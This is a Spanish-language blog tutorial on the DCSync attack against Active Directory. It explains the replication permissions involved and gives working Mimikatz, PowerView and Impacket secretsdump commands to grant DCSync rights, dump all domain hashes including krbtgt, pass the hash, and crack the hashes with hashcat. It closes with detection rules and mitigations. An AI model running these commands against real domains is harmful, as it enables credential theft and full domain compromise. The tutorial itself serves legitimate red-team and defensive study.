---
layout: single
title: "DCSync: extracción remota de hashes en Active Directory"
date: 2026-08-07
categories: [tutoriales, analisis]
tags: [active-directory, dcsync, mimikatz, impacket, drsuapi, secretsdump, domain-admin, red-team, windows]
excerpt: "Cómo funciona el ataque DCSync, qué privilegios necesita, y cómo extraer todos los hashes del dominio sin tocar el disco del Domain Controller."
permalink: /tutoriales/dcsync-active-directory/
---

DCSync es una técnica que permite extraer hashes NTLM y claves Kerberos de Active Directory sin ejecutar código en el Domain Controller. En lugar de volcar LSASS, el atacante impersona a un DC legítimo y solicita la replicación de credenciales a través del protocolo DRS (Directory Replication Service). El resultado es idéntico a obtener un backup de NTDS.dit, pero completamente remoto y sin necesidad de acceso local.

El ataque fue documentado públicamente por Benjamin Delpy e incorporado a Mimikatz en 2015. Desde entonces aparece en prácticamente todos los playbooks de red team contra entornos Windows.

---

## El protocolo DRSUAPI

Active Directory replica objetos entre Domain Controllers usando DRSUAPI (Directory Replication Service API), un protocolo RPC sobre TCP/IP. Cuando un DC necesita sincronizarse con otro, llama a `IDL_DRSGetNCChanges` — una función que devuelve los cambios de atributos de una naming context (NC) concreta.

Los atributos sensibles que nos interesan son:

| Atributo | OID | Contenido |
|---|---|---|
| `unicodePwd` | 1.2.840.113556.1.4.90 | NT hash del usuario |
| `supplementalCredentials` | 1.2.840.113556.1.4.125 | Hashes Kerberos, WDigest, etc. |
| `dBCSPwd` | 1.2.840.113556.1.4.55 | LM hash (legacy) |

Estos atributos están marcados como replication-sensitive y solo se devuelven a entidades con los permisos de replicación adecuados. Un atacante que controla una cuenta con esos permisos puede llamar directamente a `DRSGetNCChanges` desde cualquier máquina del dominio.

---

## Privilegios necesarios

Para ejecutar DCSync hace falta al menos uno de estos tres permisos en el objeto raíz del dominio (normalmente `DC=corp,DC=local`):

| Permiso | GUID | Necesario para |
|---|---|---|
| `DS-Replication-Get-Changes` | 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 | Atributos no sensibles |
| `DS-Replication-Get-Changes-All` | 1131f6ab-9c07-11d1-f79f-00c04fc2dcd2 | Atributos sensibles (hashes) |
| `DS-Replication-Get-Changes-In-Filtered-Set` | 89e95b76-444d-4c62-991a-0facbeda640c | Read-Only DCs |

Por defecto solo tienen estos permisos los grupos `Domain Admins`, `Enterprise Admins` y `Domain Controllers`. Sin embargo, en entornos mal configurados es habitual encontrar cuentas de servicio, backups o sistemas de monitorización con estos ACLs asignados explícitamente.

### Verificar quién tiene los permisos

Con PowerView:

```powershell
# Mostrar ACLs del objeto raíz del dominio
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs |
    Where-Object { $_.ObjectAceType -match "DS-Replication" } |
    Select-Object SecurityIdentifier, ObjectAceType, AceType
```

Con BloodHound, buscar en el panel de análisis: `Find Principals with DCSync Rights`. Devuelve una lista de cuentas con `GetChanges` y/o `GetChangesAll` sobre el dominio.

Si tienes control de una cuenta con permisos de escritura sobre el objeto raíz pero sin DCSync, puedes asignártelo con:

```powershell
# Requiere WriteDACL sobre DC=corp,DC=local
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" `
    -PrincipalIdentity usuario_comprometido `
    -Rights DCSync
```

---

## Ejecución con Mimikatz

La forma más directa. Desde cualquier máquina del dominio autenticada con la cuenta que tiene los permisos:

```cmd
# Extraer el hash del usuario Administrador del dominio
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrador

# Extraer todos los hashes del dominio
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

Salida relevante para una cuenta:

```
[DC] 'corp.local' will be the domain
[DC] 'DC01.corp.local' will be the DC server

Object RDN           : Administrador
** SAM ACCOUNT **
SAM Username         : Administrador
Object Security ID   : S-1-5-21-1234567890-...
Credentials:
  Hash NTLM: aad3b435b51404eeaad3b435b51404ee:fc5xxxxxxxxxxxxxxxxxxxxxxxxxx2b3e
  ntlm- 0: fc5xxxxxxxxxxxxxxxxxxxxxxxxxx2b3e
  lm  - 0: ...
Supplemental Credentials:
  Kerberos keys:
    aes256_hmac (4096): ...
    aes128_hmac (4096): ...
```

El hash NTLM del usuario `krbtgt` es especialmente valioso: con él se pueden forjar Golden Tickets válidos para cualquier cuenta del dominio sin interactuar más con el DC.

```cmd
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

---

## Ejecución remota con Impacket

`secretsdump.py` de Impacket implementa DCSync de forma nativa y es más cómodo para operar desde Linux:

```bash
# Usando contraseña
secretsdump.py corp.local/Administrador:Password123@192.168.1.10

# Usando NT hash (pass-the-hash)
secretsdump.py -hashes :fc5xxxxxxxxxxxxxxxxxxxxxxxxxx2b3e \
    corp.local/Administrador@192.168.1.10

# Solo cuenta específica
secretsdump.py corp.local/Administrador:Password123@192.168.1.10 \
    -just-dc-user krbtgt
```

La salida sigue el formato `dominio\usuario:RID:LM_hash:NT_hash:::`, compatible directamente con hashcat:

```
corp.local\Administrador:500:aad3b435b51404eeaad3b435b51404ee:fc5xxxxxxxxxxxxxxxxxxxxxxxxxx2b3e:::
corp.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8d3a34580xxxxxxxxxxxxxxxxxxxxxxx:::
```

Para crackear offline:

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --rules-file best64.rule
```

---

## Diferencias respecto a volcar LSASS

| | DCSync | LSASS dump |
|---|---|---|
| Acceso al DC | No necesario (remoto) | Requiere sesión local/RDP |
| Detección AV/EDR | Baja (tráfico RPC) | Alta (apertura de lsass.exe) |
| Evasión de herramientas | Alta | Media-baja |
| Privilegios mínimos | DCSync ACL en dominio | SeDebugPrivilege en DC |
| Hashes obtenidos | Todos los del dominio | Solo los en memoria |
| Claves AES Kerberos | Sí | Sí (si hay tickets activos) |

DCSync es preferible cuando se dispone de una cuenta con los ACLs correctos pero sin acceso interactivo al DC. LSASS dumping sigue siendo útil cuando los permisos de replicación no están disponibles pero hay una sesión en la máquina.

---

## Detección

El indicador principal en los logs de Windows es el **Event ID 4662** en el DC, con `Operation Type: Object Access` y los GUIDs de replicación en el campo `Properties`:

```
EventID: 4662
Account Name: usuario_sospechoso
Object Type: domainDNS
Properties:
  {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- GetChanges
  {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2}  <- GetChangesAll
```

Una cuenta que no es un DC generando estos eventos es una señal de DCSync. Regla de detección en KQL para Microsoft Sentinel:

```kusto
SecurityEvent
| where EventID == 4662
| where Properties has "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
    or Properties has "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2"
| where SubjectUserName !endswith "$"   // excluir cuentas de equipo (DCs)
| project TimeGenerated, SubjectUserName, SubjectDomainName, IpAddress
```

También se puede detectar a nivel de red buscando llamadas a `MSRPC` con el UUID `e3514235-4b06-11d1-ab04-00c04fc2dcd2` (interfaz DRS) desde IPs que no pertenecen a DCs conocidos.

---

## Mitigación

- Auditar periódicamente los ACLs sobre el objeto raíz del dominio con `Get-DomainObjectAcl` o BloodHound.
- Revocar `DS-Replication-Get-Changes-All` a cualquier cuenta que no sea DC o backup autorizado.
- Monitorizar Event ID 4662 con los GUIDs de replicación como regla de alta prioridad.
- Habilitar `Protected Users` para cuentas privilegiadas — reduce el valor de los hashes extraídos al deshabilitar NTLM y forzar Kerberos con AES.
- Rotar la cuenta `krbtgt` cada 180 días mínimo (dos veces consecutivas para invalidar tickets anteriores), lo que limita el tiempo de vida de un Golden Ticket obtenido vía DCSync.

---

## Referencias

- [Mimikatz - lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#dcsync)
- [Impacket secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- [MS-DRSR: Directory Replication Service Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/)
- [Detecting DCSync - Elastic Security](https://www.elastic.co/blog/defending-against-dcsync-attacks)
- [BloodHound - Find Principals with DCSync Rights](https://bloodhound.readthedocs.io/)
